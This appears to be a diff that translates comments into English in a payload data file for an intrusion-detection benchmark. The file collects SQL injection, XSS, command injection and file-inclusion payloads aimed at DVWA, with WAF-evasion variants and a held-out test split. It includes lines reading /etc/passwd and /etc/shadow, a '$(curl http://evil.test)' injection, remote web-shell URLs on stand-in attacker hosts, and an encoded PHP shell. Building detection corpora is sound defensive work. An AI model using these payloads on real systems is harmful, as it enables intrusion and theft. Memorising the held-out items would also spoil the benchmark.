@@ -1,24 +1,24 @@
-# agent-ids corpus v2 — payload khai thác cần gom (bạn điền)
+# agent-ids corpus v2 — exploit payloads to collect (you fill this in)
 # =============================================================================
-# CÁCH ĐIỀN
-#   - Mỗi payload MỘT dòng, đặt dưới đúng mục "## ...".
-#   - Dòng trống và dòng bắt đầu bằng # bị bỏ qua (có thể dùng để ghi chú).
-#   - Dán payload Y NGUYÊN như nguồn cho (không tự encode). Mục "evasion" là
-#     bản đã né/encode sẵn — dán đúng chuỗi đã encode mà nguồn đưa.
-#   - Dán dư cũng được: tôi tự BỎ TRÙNG (cả với payload v1 đã có trong repo).
-#   - cmdi tôi tự gửi thành POST form tới /vulnerabilities/exec/ — bạn chỉ cần
-#     dán phần giá trị của ô "ip".
+# HOW TO FILL IN
+#   - ONE payload per line, under the matching "## ..." section.
+#   - Blank lines and lines starting with # are ignored (use them for notes).
+#   - Paste payloads EXACTLY as the source gives them (do not encode). The "evasion"
+#     sections hold already-evaded/encoded strings — paste the encoded string as given.
+#   - Extra lines are fine: duplicates are DROPPED automatically (also against v1 payloads).
+#   - cmdi is sent as a POST form to /vulnerabilities/exec/ — paste only the value
+#     of the "ip" field.
 #
-# (TÙY CHỌN) GOM HỌ (family): các biến thể của CÙNG một kỹ thuật nên vào một
-#   "họ" để không bị chia lẻ sang cả dev lẫn test. Muốn gom thì đặt một dòng
-#   "=== tên-họ ===" trước nhóm dòng đó, ví dụ:
+# (OPTIONAL) FAMILIES: variants of the SAME technique should share a
+#   "family" so they are not split across dev and test. To group, put a line
+#   "=== family-name ===" before those lines, e.g.:
 #       === sqli-union ===
 #       1' UNION SELECT 1,2-- -
 #       1' UnIoN SeLeCt 1,2-- -
-#   Không đặt thì mỗi dòng là một họ riêng (vẫn chạy được). Tôi có thể tự gom
-#   giúp nếu bạn để trống — chỉ là gom tay chính xác hơn.
+#   Without it every line is its own family (still works). Families can be
+#   assigned automatically when left blank — grouping by hand is just more precise.
 #
-# NGUỒN CÔNG KHAI (copy từ đây, ghi rõ là nguồn nào ở báo cáo):
+# PUBLIC SOURCES (copy from here, name the source in the report):
 #   PayloadsAllTheThings  https://github.com/swisskyrepo/PayloadsAllTheThings
 #     SQLi https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 #     XSS  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
@@ -30,13 +30,13 @@
 #   OWASP XSS Filter Evasion
 #        https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 #
-# Mỗi mục có: (mục tiêu số dòng) | trang DVWA | tham số payload đi vào.
+# Each section has: (target line count) | DVWA page | parameter the payload goes into.
 # =============================================================================
 
 
-## clear_attack :: sqli   (mục tiêu 8)   /vulnerabilities/sqli/   param: id
-# nguồn: PayloadsAllTheThings SQL Injection ; PortSwigger SQLi cheat sheet
-# (dạng thẳng: OR-based, UNION SELECT, stacked ';', blind/time-based)
+## clear_attack :: sqli   (target 8)   /vulnerabilities/sqli/   param: id
+# source: PayloadsAllTheThings SQL Injection ; PortSwigger SQLi cheat sheet
+# (plain forms: OR-based, UNION SELECT, stacked ';', blind/time-based)
 
 === sqli-or-basic ===
 # PayloadsAllTheThings — OR-based authentication bypass
@@ -63,8 +63,8 @@ admin'-- -
 1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
 
 
-## clear_attack :: xss   (mục tiêu 7)   /vulnerabilities/xss_r/   param: name
-# nguồn: PortSwigger XSS cheat sheet ; OWASP XSS Filter Evasion ; PayloadsAllTheThings XSS
+## clear_attack :: xss   (target 7)   /vulnerabilities/xss_r/   param: name
+# source: PortSwigger XSS cheat sheet ; OWASP XSS Filter Evasion ; PayloadsAllTheThings XSS
 
 === xss-event-handlers ===
 # PortSwigger XSS cheat sheet — event handler injection
@@ -85,9 +85,9 @@ admin'-- -
 <iframe src="javascript:alert(1)">
 
 
-## clear_attack :: cmdi   (mục tiêu 6)   /vulnerabilities/exec/ (POST)   param: ip
-# nguồn: PayloadsAllTheThings Command Injection
-# (chuỗi nối lệnh: ; | && $() ` ...)
+## clear_attack :: cmdi   (target 6)   /vulnerabilities/exec/ (POST)   param: ip
+# source: PayloadsAllTheThings Command Injection
+# (command chaining: ; | && $() ` ...)
 
 === cmdi-basic-chain ===
 # PayloadsAllTheThings — basic command chaining
@@ -102,9 +102,9 @@ admin'-- -
 127.0.0.1; `whoami`
 
 
-## clear_attack :: lfi   (mục tiêu 6)   /vulnerabilities/fi/   param: page
-# nguồn: PayloadsAllTheThings File Inclusion / Directory Traversal ; OWASP WSTG
-# (đọc file hệ thống: /etc/passwd, /etc/shadow, ../ traversal)
+## clear_attack :: lfi   (target 6)   /vulnerabilities/fi/   param: page
+# source: PayloadsAllTheThings File Inclusion / Directory Traversal ; OWASP WSTG
+# (reading system files: /etc/passwd, /etc/shadow, ../ traversal)
 
 === lfi-unix-files ===
 # PayloadsAllTheThings / OWASP WSTG — Unix sensitive files
@@ -124,9 +124,9 @@ C:\Windows\win.ini
 C:\boot.ini
 
 
-## clear_attack :: rfi   (mục tiêu 3)   /vulnerabilities/fi/   param: page
-# nguồn: PayloadsAllTheThings File Inclusion (Remote File Inclusion)
-# (URL từ xa làm tên file: http://.../shell.txt — dùng domain .test/.example)
+## clear_attack :: rfi   (target 3)   /vulnerabilities/fi/   param: page
+# source: PayloadsAllTheThings File Inclusion (Remote File Inclusion)
+# (remote URL as the file name: http://.../shell.txt — use .test/.example domains)
 
 # PayloadsAllTheThings — Remote File Inclusion
 http://attacker.example/shell.php
@@ -134,8 +134,8 @@ https://evil.example/cmd.php
 http://10.0.0.1.example/malware.txt
 
 
-## evasion :: sqli   (mục tiêu 10)   /vulnerabilities/sqli/   param: id
-# nguồn: PayloadsAllTheThings "WAF Bypass" + encoding ; PortSwigger
+## evasion :: sqli   (target 10)   /vulnerabilities/sqli/   param: id
+# source: PayloadsAllTheThings "WAF Bypass" + encoding ; PortSwigger
 # (comment /**/, case-mix, URL-encode, double-encode, hex 0x, CHAR(), inline /*!...*/)
 
 === sqli-evade-whitespace ===
@@ -161,8 +161,8 @@ http://10.0.0.1.example/malware.txt
 1' OR CHAR(49)=CHAR(49)-- -
 
 
-## evasion :: xss   (mục tiêu 9)   /vulnerabilities/xss_r/   param: name
-# nguồn: OWASP XSS Filter Evasion ; PortSwigger XSS cheat sheet
+## evasion :: xss   (target 9)   /vulnerabilities/xss_r/   param: name
+# source: OWASP XSS Filter Evasion ; PortSwigger XSS cheat sheet
 # (nested tag, URL-encode, HTML entity, case-mix, svg/onload...)
 
 === xss-evade-template-literal ===
@@ -190,9 +190,9 @@ http://10.0.0.1.example/malware.txt
 <ScRiPt>alert(1)</ScRiPt>
 
 
-## evasion :: cmdi   (mục tiêu 8)   /vulnerabilities/exec/ (POST)   param: ip
-# nguồn: PayloadsAllTheThings Command Injection "Bypass"
-# (${IFS}, %0a newline, backslash c\at, $@ , biến tách...)
+## evasion :: cmdi   (target 8)   /vulnerabilities/exec/ (POST)   param: ip
+# source: PayloadsAllTheThings Command Injection "Bypass"
+# (${IFS}, %0a newline, backslash ct, $@ , split variables...)
 
 === cmdi-evade-quotes ===
 # PayloadsAllTheThings — quote insertion to break signature
@@ -212,8 +212,8 @@ http://10.0.0.1.example/malware.txt
 127.0.0.1;/bin/cat /etc/passwd
 
 
-## evasion :: lfi   (mục tiêu 9)   /vulnerabilities/fi/   param: page
-# nguồn: PayloadsAllTheThings File Inclusion / Directory Traversal
+## evasion :: lfi   (target 9)   /vulnerabilities/fi/   param: page
+# source: PayloadsAllTheThings File Inclusion / Directory Traversal
 # (..%2f URL-encode, ....// nested, %252e double-encode, php://filter wrapper...)
 
 === lfi-evade-double-encode ===
@@ -239,17 +239,17 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
 
 
 # =============================================================================
-# held_out — tập test giữ lại, CHƯA dùng trong bất kỳ lần chạy benchmark nào.
+# held_out — held-back test set, NOT used in any benchmark run during development.
 #
-# Nguồn: v1 payloads gốc (từ build_corpus.py trước refactor, đã bị loại ra khi
-#         chuyển sang data-file) + kỹ thuật bổ sung từ cùng nguồn công khai.
-# Build script đặt split="held_out" cho toàn bộ group này (ngoài dev và test, xếp sau cùng).
+# Source: the original v1 payloads (from build_corpus.py before the refactor, dropped when
+#         moving to a data file) + extra techniques from the same public sources.
+# The build script puts this whole group in split="held_out" (outside dev and test, ordered last).
 # =============================================================================
 
 ## held_out :: sqli   /vulnerabilities/sqli/   param: id
 
 === sqli-classic ===
-# v1 — PayloadsAllTheThings / PortSwigger (OR-based, không có trong corpus hiện tại)
+# v1 — PayloadsAllTheThings / PortSwigger (OR-based, not in the current corpus)
 1' OR '1'='1
 1' OR 1=1-- -
 
@@ -278,7 +278,7 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
 # --- evasion-style (WAF bypass / encoding) ---
 
 === sqli-evade-classic ===
-# v1 — PayloadsAllTheThings comment + case mix (không có trong corpus hiện tại)
+# v1 — PayloadsAllTheThings comment + case mix (not in the current corpus)
 1'/**/OR/**/1=1-- -
 1' UnIoN SeLeCt 1,2-- -
 
@@ -287,12 +287,12 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
 1' /*!50000UNION*/ /*!50000SELECT*/ 1,2-- -
 
 === sqli-evade-url-encoded-classic ===
-# v1 — OWASP URL-encoded SQLi (khác với %09/%0a trong corpus)
+# v1 — OWASP URL-encoded SQLi (differs from %09/%0a in the corpus)
 1%27%20OR%201%3D1--%20-
 1%2527%2520OR%25201%253D1
 
 === sqli-evade-hex-v1 ===
-# v1 — PayloadsAllTheThings hex comparison (khác variant trong corpus)
+# v1 — PayloadsAllTheThings hex comparison (differs from variant in the corpus)
 1' OR 0x31=0x31-- -
 
 === sqli-evade-subquery ===
@@ -304,14 +304,14 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
 ## held_out :: xss   /vulnerabilities/xss_r/   param: name
 
 === xss-classic ===
-# v1 — OWASP / PortSwigger (không có trong corpus hiện tại)
+# v1 — OWASP / PortSwigger (not in the current corpus)
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
 <svg/onload=alert(document.cookie)>
 javascript:alert(1)
 
 === xss-uncommon-tags ===
-# new — PortSwigger XSS cheat sheet (ít dùng hơn)
+# new — PortSwigger XSS cheat sheet (less common)
 <marquee onstart=alert(1)>
 <object data=javascript:alert(1)>
 <form><button formaction=javascript:alert(1)>click
@@ -323,11 +323,11 @@ javascript:alert(1)
 # --- evasion-style ---
 
 === xss-evade-nested-classic ===
-# v1 — OWASP nested-tag bypass (khác với case-mix trong corpus)
+# v1 — OWASP nested-tag bypass (differs from case-mix in the corpus)
 <scr<script>ipt>alert(1)</scr</script>ipt>
 
 === xss-evade-url-encoded-classic ===
-# v1 — OWASP single-percent URL-encode (khác %253C double-encode trong corpus)
+# v1 — OWASP single-percent URL-encode (differs from %253C double-encode in the corpus)
 %3Cscript%3Ealert(1)%3C/script%3E
 
 === xss-evade-case-mix-classic ===
@@ -335,7 +335,7 @@ javascript:alert(1)
 <IMG SRC=x ONERROR=alert(1)>
 
 === xss-evade-entity-classic ===
-# v1 — PortSwigger HTML entity in script tag (khác svg onload variant trong corpus)
+# v1 — PortSwigger HTML entity in script tag (differs from svg onload variant in the corpus)
 <svg><script>&#97;lert(1)</script>
 
 === xss-evade-js-context ===
@@ -351,7 +351,7 @@ javascript:alert(1)
 ## held_out :: cmdi   /vulnerabilities/exec/ (POST)   param: ip
 
 === cmdi-classic ===
-# v1 — PayloadsAllTheThings / OWASP (không có trong corpus hiện tại)
+# v1 — PayloadsAllTheThings / OWASP (not in the current corpus)
 127.0.0.1; cat /etc/passwd
 127.0.0.1 && whoami
 127.0.0.1 | id
@@ -366,7 +366,7 @@ $(curl http://evil.test)
 # --- evasion-style ---
 
 === cmdi-evade-ifs-classic ===
-# v1 — PayloadsAllTheThings IFS bypass (không có trong corpus hiện tại)
+# v1 — PayloadsAllTheThings IFS bypass (not in the current corpus)
 127.0.0.1;cat${IFS}/etc/passwd
 
 === cmdi-evade-newline-classic ===
@@ -374,7 +374,7 @@ $(curl http://evil.test)
 127.0.0.1%0acat%20/etc/passwd
 
 === cmdi-evade-backslash-classic ===
-# v1 — PayloadsAllTheThings backslash evasion (khác c\at variant trong corpus)
+# v1 — PayloadsAllTheThings backslash evasion (differs from c\at variant in the corpus)
 127.0.0.1;c\at /et\c/pa\sswd
 
 === cmdi-evade-var ===
@@ -386,7 +386,7 @@ $(curl http://evil.test)
 ## held_out :: lfi   /vulnerabilities/fi/   param: page
 
 === lfi-classic ===
-# v1 — OWASP / PayloadsAllTheThings (không có trong corpus hiện tại)
+# v1 — OWASP / PayloadsAllTheThings (not in the current corpus)
 ../../../../../../etc/passwd
 /etc/passwd
 ../../../../etc/shadow
@@ -401,19 +401,19 @@ $(curl http://evil.test)
 # --- evasion-style ---
 
 === lfi-evade-single-url-classic ===
-# v1 — OWASP single-percent URL-encode (khác %252f double-encode trong corpus)
+# v1 — OWASP single-percent URL-encode (differs from %252f double-encode in the corpus)
 ..%2f..%2f..%2f..%2fetc%2fpasswd
 
 === lfi-evade-nested-slash-classic ===
-# v1 — PayloadsAllTheThings nested slash bypass (khác ....\/  trong corpus)
+# v1 — PayloadsAllTheThings nested slash bypass (differs from ....\/  in the corpus)
 ....//....//....//etc/passwd
 
 === lfi-evade-dot-encode-classic ===
-# v1 — PayloadsAllTheThings encoded dot (khác ..%252f trong corpus)
+# v1 — PayloadsAllTheThings encoded dot (differs from ..%252f in the corpus)
 %252e%252e%252fetc%252fpasswd
 
 === lfi-evade-php-filter-classic ===
-# v1 — PayloadsAllTheThings PHP filter wrapper (khác php://input trong corpus)
+# v1 — PayloadsAllTheThings PHP filter wrapper (differs from php://input in the corpus)
 php://filter/convert.base64-encode/resource=index
 
 === lfi-evade-dot-segment ===
@@ -425,7 +425,7 @@ php://filter/convert.base64-encode/resource=index
 
 ## held_out :: rfi   /vulnerabilities/fi/   param: page
 
-# v1 — OWASP Remote File Inclusion (URL khác với các entry trong corpus)
+# v1 — OWASP Remote File Inclusion (URL differs from the corpus entries)
 http://evil.test/shell.txt
 # new — PayloadsAllTheThings
 http://evil.test/c99.php
